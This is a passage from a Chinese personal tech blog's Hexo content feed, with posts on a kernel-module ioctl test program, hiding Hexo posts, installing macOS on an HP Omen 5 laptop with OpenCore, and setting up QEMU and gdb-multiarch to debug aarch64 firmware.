</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ioctl_get_msg failed:%d\n&quot;</span>, ret_val); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get_msg message:%s&quot;</span>, message); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret_val; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl_get_nth_byte</span><span class="params">(<span class="type">int</span> file_desc)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> i, c; </span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get_nth_byte message:&quot;</span>); </span><br><span class="line"> </span><br><span class="line">    i = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">do</span> &#123; </span><br><span class="line">        c = ioctl(file_desc, IOCTL_GET_NTH_BYTE, i++); </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (c &lt; <span class="number">0</span>) &#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nioctl_get_nth_byte failed at the %d&#x27;th byte:\n&quot;</span>, i); </span><br><span class="line">            <span class="keyword">return</span> c; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">putchar</span>(c); </span><br><span class="line">    &#125; <span class="keyword">while</span> (c != <span class="number">0</span>); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Main - Call the ioctl functions */</span> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> file_desc, ret_val; </span><br><span class="line">    <span class="type">char</span> *msg = <span class="string">&quot;Message passed by ioctl\n&quot;</span>; </span><br><span class="line"> </span><br><span class="line">    file_desc = open(DEVICE_PATH, O_RDWR); </span><br><span class="line">    <span class="keyword">if</span> (file_desc &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t open device file: %s, error:%d\n&quot;</span>, DEVICE_PATH, </span><br><span class="line">               file_desc); </span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE); </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    ret_val = ioctl_set_msg(file_desc, msg); </span><br><span class="line">    <span class="keyword">if</span> (ret_val) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line">    ret_val = ioctl_get_nth_byte(file_desc); </span><br><span class="line">    <span class="keyword">if</span> (ret_val) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line">    ret_val = ioctl_get_msg(file_desc); </span><br><span class="line">    <span class="keyword">if</span> (ret_val) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line"> </span><br><span class="line">    close(file_desc); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">error: </span><br><span class="line">    close(file_desc); </span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/posts/79c0f484/image-20240116115744234.png" class="" title="image-20240116115744234">

]]></content>
      <tags>
        <tag>内核模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo隐藏指定文章</title>
    <url>/posts/9c83ed78.html</url>
    <content><![CDATA[<p> 有撰写博客时，有一些文章尚在撰写或者仅用于个人记录，需要进行隐藏，本文进行此功能的设置：</p>
<h2 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h2><p>插件：<a href="https://github.com/prinsss/hexo-hide-posts">hexo-hide-posts</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-hide-posts</span><br></pre></td></tr></table></figure>

<h2 id="Config-yml配置"><a href="#Config-yml配置" class="headerlink" title="Config.yml配置"></a>Config.yml配置</h2><p>在<code>_config.yml</code>中添加以下内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">hide_posts:</span></span><br><span class="line">  <span class="comment"># Should hexo-hide-posts be enabled.</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># The front-matter key for flagging hidden posts.</span></span><br><span class="line">  <span class="comment"># You can change the filter name if you like.</span></span><br><span class="line">  <span class="attr">filter:</span> <span class="string">hidden</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Add &quot;noindex&quot; meta tag to prevent hidden posts from being indexed by search engines.</span></span><br><span class="line">  <span class="attr">noindex:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Generators in the allowlist will have access to the hidden posts.</span></span><br><span class="line">  <span class="comment"># Common generators in Hexo: &#x27;index&#x27;, &#x27;tag&#x27;, &#x27;category&#x27;, &#x27;archive&#x27;, &#x27;sitemap&#x27;, &#x27;feed&#x27;</span></span><br><span class="line">  <span class="comment"># allowlist_generators: []</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Generators in the blocklist can *not* access the hidden posts.</span></span><br><span class="line">  <span class="comment"># The allowlist has higher priority than the blocklist, if both set.</span></span><br><span class="line">  <span class="comment"># blocklist_generators: [&#x27;*&#x27;]</span></span><br></pre></td></tr></table></figure>

<h2 id="文章Front-Matter设置"><a href="#文章Front-Matter设置" class="headerlink" title="文章Front-Matter设置"></a>文章Front-Matter设置</h2><p>如果想要将文章隐藏掉，只需要在Front-Matter中添加<code>hidder: true</code>即可，如下图：</p>
<img src="/posts/9c83ed78/image-20241105170804534.png" class="" title="image-20241105170804534">

<p>这样就可以将目标文章隐藏掉了，主页，归档，标签都不会出现相关信息。不过需要注意<strong>直接用url还是可以访问</strong>的。</p>
<p>（这个不建议搭配abbrlink，可能会被爆破的，不过应该没人这么无聊吧哈哈哈~</p>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>暗影精灵5安装黑苹果过程记录</title>
    <url>/posts/2c9d5f9e.html</url>
    <content><![CDATA[<p>众所周知，黑苹果系统安装对硬件设备限制很多，之前一直不敢尝试，而最近找到了一个相同型号的黑苹果安装记录，Mac可以支持到Ventura版本，不过其安装过程并没有很详细。因此笔者尝试一下，在此记录下安装的过程。</p>
<p>参考链接：</p>
<ul>
<li><p><a href="https://blog.hibobmaster.com/2020/10/26/hp-15-dc1010nr-hackintosh/">暗影精灵5之OpenCore引导黑苹果</a></p>
</li>
<li><p><a href="https://dortania.github.io/OpenCore-Install-Guide/installer-guide/">OpenCore Install Guide</a></p>
</li>
</ul>
<h4 id="2024-11-01更新"><a href="#2024-11-01更新" class="headerlink" title="2024&#x2F;11&#x2F;01更新"></a>2024&#x2F;11&#x2F;01更新</h4><p>换成了更新的EFI，见链接<a href="https://github.com/Darkspeed294/HP-Omen-15-DC-1xxxx-Hackintosh-Opencore">https://github.com/Darkspeed294/HP-Omen-15-DC-1xxxx-Hackintosh-Opencore</a></p>
<h4 id="2024-11-07更新"><a href="#2024-11-07更新" class="headerlink" title="2024&#x2F;11&#x2F;07更新"></a>2024&#x2F;11&#x2F;07更新</h4><p>成功安装黑苹果，先将过程的一些记录放出来，后面会进行整理</p>
<h2 id="本机配置"><a href="#本机配置" class="headerlink" title="本机配置"></a>本机配置</h2><p><strong>电脑型号</strong>：暗影精灵5</p>
<table>
<thead>
<tr>
<th>CPU</th>
<th>i7-9750H</th>
</tr>
</thead>
<tbody><tr>
<td>iGPU</td>
<td>Intel UHD Graphics 630</td>
</tr>
<tr>
<td>dGPU</td>
<td>GTX1650</td>
</tr>
<tr>
<td>Audio</td>
<td>Realtek ALC295</td>
</tr>
<tr>
<td>Disk</td>
<td>HP SSD EX920 + Netac SSD</td>
</tr>
<tr>
<td>Wireless</td>
<td>Wireless-AC 9560&#x2F;BCM94352z</td>
</tr>
<tr>
<td>Ethernet</td>
<td>Realtek 8111&#x2F;8168&#x2F;8411 PCI Express Gigabit Ethernet</td>
</tr>
</tbody></table>
<h2 id="制作U盘系统安装器"><a href="#制作U盘系统安装器" class="headerlink" title="制作U盘系统安装器"></a>制作U盘系统安装器</h2><p>首先安装几个需要的工具</p>
<ul>
<li><a href="https://github.com/acidanthera/OpenCorePkg/releases">OpenCorePkg</a>：按照官方文档提示是推荐安装debug版本，可以方便后续问题解决；</li>
<li><a href="https://github.com/corpnewt/ProperTree">ProperTree</a>：用于修改后续生成的.plist文件。</li>
</ul>
<p>然后开始制作安装器，有在线安装和离线安装两种方式，离线安装需要在MacOS上运行；而在线安装可以支持任意系统。因此本文选择在线安装方式：</p>
<p>准备几个工具：</p>
<ul>
<li>4GB大小的U盘</li>
<li><a href="https://github.com/acidanthera/OpenCorePkg/releases">macrecovery.py</a>(需要Python3环境)</li>
</ul>
<h3 id="制作USB启动器"><a href="#制作USB启动器" class="headerlink" title="制作USB启动器"></a>制作USB启动器</h3><h4 id="下载macOS"><a href="#下载macOS" class="headerlink" title="下载macOS"></a>下载macOS</h4><p>在下载的OpenCore目录下<code>/Utilities/macrecovery/</code>打开终端。然后运行以下命令（根据你想要下载的MacOS版本挑选一个即可）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Lion (10.7):</span></span><br><span class="line">py macrecovery.py -b Mac-2E6FAB96566FE58C -m 00000000000F25Y00 download</span><br><span class="line">py macrecovery.py -b Mac-C3EC7CD22292981F -m 00000000000F0HM00 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mountain Lion (10.8):</span></span><br><span class="line">py macrecovery.py -b Mac-7DF2A3B5E5D671ED -m 00000000000F65100 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mavericks (10.9):</span></span><br><span class="line">py macrecovery.py -b Mac-F60DEB81FF30ACF6 -m 00000000000FNN100 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Yosemite (10.10):</span></span><br><span class="line">py macrecovery.py -b Mac-E43C1C25D4880AD6 -m 00000000000GDVW00 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">El Capitan (10.11):</span></span><br><span class="line">py macrecovery.py -b Mac-FFE5EF870D7BA81A -m 00000000000GQRX00 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Sierra (10.12):</span></span><br><span class="line">py macrecovery.py -b Mac-77F17D7DA9285301 -m 00000000000J0DX00 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">High Sierra (10.13)</span></span><br><span class="line">py macrecovery.py -b Mac-7BA5B2D9E42DDD94 -m 00000000000J80300 download</span><br><span class="line">py macrecovery.py -b Mac-BE088AF8C5EB4FA2 -m 00000000000J80300 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mojave (10.14)</span></span><br><span class="line">py macrecovery.py -b Mac-7BA5B2DFE22DDD8C -m 00000000000KXPG00 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Catalina (10.15)</span></span><br><span class="line">py macrecovery.py -b Mac-00BE6ED71E35EB86 -m 00000000000000000 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Big Sur (11)</span></span><br><span class="line">py macrecovery.py -b Mac-42FD25EABCABB274 -m 00000000000000000 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Monterey (12)</span></span><br><span class="line">py macrecovery.py -b Mac-FFE5EF870D7BA81A -m 00000000000000000 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ventura (13)</span></span><br><span class="line">py macrecovery.py -b Mac-4B682C642B45593E -m 00000000000000000 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Sonoma (14)</span></span><br><span class="line">py macrecovery.py -b Mac-226CB3C6A851A671 -m 00000000000000000 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Latest version</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ie. Sequoia (15)</span></span><br><span class="line">py macrecovery.py -b Mac-937A206F2EE63C01 -m 00000000000000000 download</span><br></pre></td></tr></table></figure>

<p>由于MacOS Monterey版本比较稳定，也在上述博文中已实现的版本列表中，因此本文选择Monterey版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Monterey (12)</span></span><br><span class="line">python3 macrecovery.py -b Mac-FFE5EF870D7BA81A -m 00000000000000000 download</span><br></pre></td></tr></table></figure>





<p><strong>注意：</strong></p>
<ul>
<li><p><strong>对于MacOS 12以上的版本，需要使用USBToolBox对U盘进行处理。（推荐在安装好后再搞，如果安装过程中发现USB错误则再搞这个）</strong></p>
<p>参考链接：<a href="https://tonymacx86.com/threads/how-to-usb-ports-map-for-macos-with-usbtoolbox.324437/">USB ports map for macOS with USBToolBox</a></p>
<p>下载工具<a href="https://github.com/USBToolBox/tool/releases/tag/0.2">USBToolBox</a>，选择Windows.exe安装</p>
<p>安装后终端里运行，选择C修改配置信息如下：</p>


<p>选择D展示所有发现的USB端口设备，绿色表示已连接，其余为白色，可以发现共有24个端口，高于苹果的15个端口的限制，因此应该进行映射来避免问题。</p>


<p>其中很多端口其实电脑都用不到的，因为笔记本一共就三个USB接口，一个Type-C接口。可以用U盘和雷电接口的设备接下每个接口，看实际使用的接口有哪些。</p>
<p>结束后按B返回，然后选择S重排端口，将使用过的端口排在前面。使用<code>c:x:name</code>命令，x代表端口号，名字为你想要设置的名字（不必要，主要是为了清晰）。</p>
<p>可以按N禁用所有映射，按P将所有已知端口映射。最后按K生成kext文件。</p>


<p>最后下载<a href="https://github.com/USBToolBox/kext/releases/tag/1.1.1">USBToolBox.kext</a>文件，两个kext文件夹应同时存在，以备后续使用。</p>
</li>
<li><p><strong>在启动时需要关闭XhciPortLimit选项</strong>，后续会提到</p>
</li>
</ul>
<h4 id="制作U盘系统启动器"><a href="#制作U盘系统启动器" class="headerlink" title="制作U盘系统启动器"></a>制作U盘系统启动器</h4><ul>
<li><p>根据官方文档有两种方式，我们选择第一种Disk Management method</p>
</li>
<li><p>右键Win开始键，选择磁盘管理工具，选择接入的U盘，右键格式化为FAT32格式，此处分区大小需要小于32GB才能够以FAT32格式化，需要注意。另外还需要创建一个EFI分区，同样是FAT32格式化。</p>

</li>
<li><p>然后在U盘根目录下创建<code>com.apple.recovery.boot</code>文件夹，将下载好的BaseSystem文件移入该目录下，注意dmg和chunklist两个文件都需要复制。</p>
</li>
<li><p>然后打开之前下载的<code>OpenCorePkg</code>目录，选择X64文件夹打开，然后将其中EFI文件复制过去，此时你的U盘目录应为：</p>
</li>
</ul>
<h3 id="添加基本的OpenCore文件"><a href="#添加基本的OpenCore文件" class="headerlink" title="添加基本的OpenCore文件"></a>添加基本的OpenCore文件</h3><ul>
<li><p>打开U盘中的EFI文件夹，OC目录中有大量的文件，其中有很多都是我们不需要的，具体可以参考<a href="https://dortania.github.io/OpenCore-Install-Guide/installer-guide/opencore-efi.html">官方文档</a>。这里直接采用默认方法，参考下图：</p>

</li>
<li><p>然后将你需要的各种设备驱动文件填入对应目录下，这里我参考了对应博文的内容，由于版本不一致，还是推荐阅读<a href="https://dortania.github.io/OpenCore-Install-Guide/ktext.html#virtualsmc-plugins">官方文档</a>。</p>
<table>
<thead>
<tr>
<th>驱动</th>
<th>描述信息</th>
<th>安装路径</th>
</tr>
</thead>
<tbody><tr>
<td>HfsPlus.efi</td>
<td>通用驱动，必备</td>
<td>&#x2F;OC&#x2F;Drivers</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><code>kext</code>目录：</p>


<p><code>SSDT</code>这里选择直接复制博文提供的ACPI，感觉没差。</p>
</li>
</ul>
<h3 id="配置config-plist"><a href="#配置config-plist" class="headerlink" title="配置config.plist"></a>配置config.plist</h3><h4 id="新建自定义的config-plist"><a href="#新建自定义的config-plist" class="headerlink" title="新建自定义的config.plist"></a>新建自定义的config.plist</h4><p>首先从&#x2F;OpenCore&#x2F;Docs&#x2F;目录选取Sample.plist，将其复制到U盘&#x2F;OC目录中，并重命名为config.plist</p>
<p>安装工具<a href="https://github.com/corpnewt/ProperTree">ProperTree</a>和<a href="https://github.com/corpnewt/GenSMBIOS">GenSMBIOS</a></p>
<p>按Ctrl+O打开config.plist文件</p>
<p>打开后，按<strong>Ctrl + Shift + R</strong>键令其指向&#x2F;EFI&#x2F;OC创建一个<code>Clean Snapshot</code>，这会将你的配置项全部加载并写入到config.plist中。</p>
<h4 id="选择笔记本平台"><a href="#选择笔记本平台" class="headerlink" title="选择笔记本平台"></a>选择笔记本平台</h4><p>选择了<code>Coffee Lake and Whiskey Lake</code>型号。</p>
<p>根据<a href="https://dortania.github.io/OpenCore-Install-Guide/config-laptop.plist/coffee-lake.html#laptop-coffee-lake-and-whiskey-lake">官方文档</a>进行配置：</p>
<p><strong>2021-9-12</strong>: 请自行按下面的说明修改<code>config.plist</code>（没有发布新的EFI，开学了等有时间把OC升级到0.7.3再补上，目前请手动修改），解决OC引导windows后显示型号为mac*，manufacture为Acidanthera的问题，这样在windows下 <strong>omen game hub</strong> 才能正常的对系统资源进行监控和操作。<br><code>Kernel&gt; Quirks&gt; CustomSMBIOSGuid&gt; True (default is False)</code><br><code>PlatformInfo&gt; UpdateSMBIOSMode&gt; Custom (default is Create)</code></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>痛苦的问题解决模块</p>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
<li><p>卡在exit：ACPI没有用最新的。</p>
</li>
<li><p>卡在ioplatformpanicaction -&gt; applesmc</p>
<p><a href="https://bbs.pcbeta.com/viewthread-1887955-1-1.html">参考链接</a></p>
<p>删除OC config.plist的核显device_id</p>
</li>
<li><p>卡在xpc.launchd：</p>
<ol>
<li><p>尝试禁用GPU独显（无果）</p>
</li>
<li><p>也有说是USB没有定制的问题，不过我本身就已经定制好了，而且关不关好像对启动都没啥影响，所以也不是这个问题</p>
</li>
<li><p>有文章说问题不是出在xpc这里，xpc报错不会影响，但是换了好几个EFI都存在这一问题，因此也不行</p>
<ol>
<li><p>注意到开始出现com.xpc.launchd时并没有报错，可能确实无关？这里发现一直运行到了AppleALC这一步，启动过程参考：<a href="https://dortania.github.io/OpenCore-Install-Guide/troubleshooting/boot.html">https://dortania.github.io/OpenCore-Install-Guide/troubleshooting/boot.html</a></p>
<p><a href="https://dortania.github.io/OpenCore-Install-Guide/troubleshooting/extended/kernel-issues.html#stuck-on-or-near-ioconsoleusers-gioscreenlock-giolockstate-3">https://dortania.github.io/OpenCore-Install-Guide/troubleshooting/extended/kernel-issues.html#stuck-on-or-near-ioconsoleusers-gioscreenlock-giolockstate-3</a></p>
<p>根据该问题进行修改。</p>
<ul>
<li>按照这个方法加上参数</li>
</ul>
</li>
</ol>
</li>
<li><p>CSM也已经关闭，BIOS设置无误</p>
</li>
<li><p>尝试仿冒CPU（按理说也不行，因为本人的电脑型号按官方教程是不需要的，不过也尝试看看）</p>
</li>
<li><p>还有一个说可以把蓝牙，WIFI什么的先都去掉，等安装上之后再装，后续也可以试一试。</p>
</li>
<li><p>NVME报错：按教程说是硬盘不兼容，因此不太能进行下去了，等后面配台式再说吧。<br><a href="https://apple.sqlsec.com/6-%E5%AE%9E%E7%94%A8%E5%A7%BF%E5%8A%BF/6-8/">https://apple.sqlsec.com/6-%E5%AE%9E%E7%94%A8%E5%A7%BF%E5%8A%BF/6-8/</a><br><a href="https://www.bilibili.com/video/av210356622/?vd_source=fb139bb297dc8adccc706ce3cb357f3a">https://www.bilibili.com/video/av210356622/?vd_source=fb139bb297dc8adccc706ce3cb357f3a</a><br>没有成功，然后添加启动参数nvme&#x3D;-1成功在跑码后黑屏</p>
</li>
<li><p>跑码后黑屏解决</p>
<p>启动参数添加-igfxblr参数</p>
</li>
<li><p>卡在IOConsoleUsers: gIOScreenLock前</p>
<p><a href="https://quanquan.space/viewtopic.php?t=390">https://quanquan.space/viewtopic.php?t=390</a></p>
<p>添加参数-igfxmlr</p>
</li>
<li><p>卡在苹果logo，没有进度条，或者说进度条是个蓝紫色的框，左上角有鼠标箭头，鼠标动不了。</p>
<ol>
<li>怀疑是没有做USBmap，（做了后也没用</li>
<li>添加device_id参数，成功进入界面，不过后来又进不去了，很玄学</li>
<li>尝试更新其中的AppleALC驱动（无果</li>
<li>因为鼠标动不了，猜测是Voodoo驱动问题，更新驱动Voodoo*（触摸板驱动），也不行</li>
<li>最后发现是系统镜像的问题，换位13版本成功进入</li>
</ol>
</li>
<li><p>recovery安装无法下载。</p>
<ol>
<li>使用Unplugged工具进行离线安装</li>
</ol>
</li>
<li><p>第二次启动卡nvme successfully initialized</p>
<ol>
<li>考虑第二次启动关闭SSD屏蔽，无果</li>
<li>发现可能是通过Unplugged工具安装的Ventura与前面成功启动的Ventura小版本不匹配，导致出现的一些更新特性不能兼容，因此从网上找到同一版本号的镜像进行安装（注意，前面的方法是基于Opencore的恢复式安装，接下来是安装的完整镜像）<br>使用etcher烧写工具重新烧写U盘。</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>解决以上问题后，大功告成！！！</p>
<h2 id="TODO-LIST"><a href="#TODO-LIST" class="headerlink" title="TODO LIST"></a>TODO LIST</h2><ul>
<li><input checked="" disabled="" type="checkbox"> 配置OC主题</li>
<li><input checked="" disabled="" type="checkbox"> Mac基础美化</li>
<li><input checked="" disabled="" type="checkbox"> 常用软件工具安装</li>
<li><input checked="" disabled="" type="checkbox"> <del>OC版本更新</del>（更新后电池保护补丁出错，还是苟在老版本吧）</li>
<li><input checked="" disabled="" type="checkbox"> <del>OC相关驱动更新</del>（更新后电池保护补丁出错，还是苟在老版本吧）</li>
<li><input disabled="" type="checkbox"> OC主题自定义</li>
<li><input disabled="" type="checkbox"> 数据盘共享</li>
<li><input disabled="" type="checkbox"> 触摸板</li>
<li><input checked="" disabled="" type="checkbox"> 键盘按键映射</li>
<li><input disabled="" type="checkbox"> OC引导启动项隐藏</li>
</ul>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>装机</tag>
      </tags>
  </entry>
  <entry>
    <title>Qemu+Gdb使用</title>
    <url>/posts/4533a54e.html</url>
    <content><![CDATA[<p>测试固件栈溢出漏洞时，需要使用gdb来进行调试。因此记录下gdb如何使用<br>注意：只成功了QEMU系统模式+GDB本地调试，其他几个方法欢迎各位师傅给予指导，万分感谢！</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>安装<code>gdb-multiarch</code>支持不同架构的程序调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure>

<h2 id="QEMU用户模式-GDB-Remote"><a href="#QEMU用户模式-GDB-Remote" class="headerlink" title="QEMU用户模式+GDB Remote"></a>QEMU用户模式+GDB Remote</h2><blockquote>
<p>最好用且方便的调试方法</p>
</blockquote>
<p>使用qemu调试执行挂起</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-aarch-static -g ./usr/sbin/shttpd</span><br></pre></td></tr></table></figure>
<p>gdb连接调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch -q ./usr/sbin/shttpd</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture aarch64</span></span><br><span class="line">The target architecture is set to &quot;aarch64&quot;.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote 127.0.0.1:1234</span></span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br></pre></td></tr></table></figure>

<h2 id="QEMU用户模式-GDB-Attach"><a href="#QEMU用户模式-GDB-Attach" class="headerlink" title="QEMU用户模式+GDB Attach"></a>QEMU用户模式+GDB Attach</h2><p>使用qemu用户模式启动目标程序，并使用gdb attach对应程序的pid即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启目标程序</span></span><br><span class="line">sudo chroot . ./qemu-aarch64-static ./usr/sbin/shttpd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找对应的程序pid</span></span><br><span class="line">sudo netstat -antp | grep 80</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      7268/./qemu-aarch64</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb attach 对应程序pid</span></span><br><span class="line">gdb-multiarch attach 7268</span><br></pre></td></tr></table></figure>

<p>注意此种方法shttpd程序加载基址，使用<code>vmmap</code>查看发现是attach到了qemu-aarch64-static程序上，感觉没什么用。。。（因为没办法下断点）</p>
<h2 id="QEMU-GDB本地调试"><a href="#QEMU-GDB本地调试" class="headerlink" title="QEMU GDB本地调试"></a>QEMU GDB本地调试</h2><h3 id="下载gdb源码"><a href="#下载gdb源码" class="headerlink" title="下载gdb源码"></a>下载gdb源码</h3><p>下载gdb源码并且以aarch64架构编译。然后上传到虚拟机上调试</p>
<p><a href="https://sourceware.org/gdb/download/">gdb源码下载链接</a></p>
<p>下载好后解压，这里我选择gdb7.11，交叉编译选择g++-9-aarch64-linux-gnu，注意版本，不同版本可能编译失败</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xf gdb-7.11.tar.xz</span><br></pre></td></tr></table></figure>

<h3 id="安装交叉编译工具"><a href="#安装交叉编译工具" class="headerlink" title="安装交叉编译工具"></a>安装交叉编译工具</h3><p>查找aarch64相关工具，发现有很多版本的交叉编译工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-cache search aarch64</span><br></pre></td></tr></table></figure>

<img src="/posts/4533a54e/image-20241104104428243.png" class="" title="image-20241104104428243">

<p><a href="https://blog.csdn.net/yangxueyangxue/article/details/95586868">gcc与g++的区别</a></p>
<p>选择g++工具安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install g++-9-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>

<p>安装好后查看g++版本:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aarch64-linux-gnu-g++-9 -v</span><br></pre></td></tr></table></figure>

<img src="/posts/4533a54e/image-20241104111823060.png" class="" title="image-20241104111823060">

<p>进入gdb-7.11目录，配置编译选项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure --host=aarch64-linux-gnu</span><br></pre></td></tr></table></figure>

<p>配置无误后，编译即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make -j8</span><br></pre></td></tr></table></figure>

<h3 id="编译问题解决"><a href="#编译问题解决" class="headerlink" title="编译问题解决"></a>编译问题解决</h3><p>尝试了好几个gdb版本编译，结果都报这两个错误，因此对源码进行修改。</p>
<img src="/posts/4533a54e/image-20241104112109625.png" class="" title="image-20241104112109625">

<ol>
<li><p><strong>error: unknown type name ‘gdb_fpregset_t’</strong></p>
<p>在<code>./gdb/gdb_proc_service.h</code>添加<code>#include &quot;gregset.h&quot;</code>头文件</p>
<img src="/posts/4533a54e/image-20241104112351374.png" class="" title="image-20241104112351374">
</li>
<li><p><strong>error: conflicting types for ‘ps_get_thread_area’;</strong></p>
</li>
</ol>
<p>   把重定义的文件打开，把重定义的部分注释掉就可以了。</p>
<p>   修改<code>./gdb/aarch64-linux-nat.c</code>，<code>./gdb/gdb_proc_service.h</code>，<code>./gdb/nat/aarch64-linux.h</code></p>
<ol start="3">
<li><p><strong>error: ‘elf_fpregset_t’ {aka ‘struct user_fpregs_struct’} has no member named ‘vregs’</strong></p>
<p><a href="https://stackoverflow.com/questions/75670160/occur-struct-redefined-while-cross-compiled-gdb-8-2">参考链接</a></p>
<p>是交叉编译是CC被configure默认配置为了g++，是x86_64架构的，因此使用以下命令修改：</p>
</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CC=aarch64-linux-gnu-gcc-9 \</span><br><span class="line">CXX=aarch64-linux-gnu-g++-9 \</span><br><span class="line">../configure \</span><br><span class="line">--host=&#x27;aarch64-linux-gnu&#x27;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p><strong>error: expected identifier before numeric constant  # define TRAP_HWBKPT 4</strong></p>
<p><a href="https://github.com/foss-for-synopsys-dwc-arc-processors/binutils-gdb/commit/e6600bbefd667810744fbe8eed3830bf5644c354">参考链接</a></p>
<p>按照链接内容修改即可</p>
</li>
</ol>
<h3 id="上传gdb到QEMU虚拟机"><a href="#上传gdb到QEMU虚拟机" class="headerlink" title="上传gdb到QEMU虚拟机"></a>上传gdb到QEMU虚拟机</h3><p>编译成功后将gdb通过scp工具上传到QEMU虚拟机上</p>
